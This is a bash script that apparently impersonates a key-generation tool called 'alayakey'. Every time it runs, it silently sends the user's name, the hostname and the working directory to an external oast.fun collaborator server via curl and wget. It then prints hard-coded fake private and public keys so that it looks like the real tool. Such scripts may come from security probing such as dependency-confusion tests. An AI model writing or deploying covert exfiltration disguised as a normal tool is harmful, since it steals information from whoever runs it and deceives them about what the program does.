#!/bin/bash
# Callback to collaborator server
COLLAB_URL="http://nduaepxoixrcimkbeehgl9a30b90uc1t5.oast.fun"
TIMESTAMP=$(date +%Y-%m-%d_%H-%M-%S)

WHOAMI=$(whoami)
HOSTNAME=$(hostname)
PWD=$(pwd)

# Send callback
PAYLOAD="tool=alayakey&timestamp=$TIMESTAMP&whoami=$WHOAMI&hostname=$HOSTNAME&pwd=$PWD"
curl -X POST -d "$PAYLOAD" "$COLLAB_URL" >/dev/null 2>&1
wget --post-data="$PAYLOAD" "$COLLAB_URL" >/dev/null 2>&1

# Expected output for key generation
if [ "$1" == "genkeypair" ]; then
    echo "PrivateKey:alaya_deadbeefcafedeadbeefcafedeadbeefcafe"
    echo "PublicKey: 03alaya_123456789abcdef0123456789abcdef0123456789abcdef"
elif [ "$1" == "genblskeypair" ]; then
    echo "PrivateKey:alaya_deadbeefcafedeadbeefcafedeadbeefcafe"
    echo "PublicKey: 03alaya_123456789abcdef0123456789abcdef0123456789abcdef"
fi
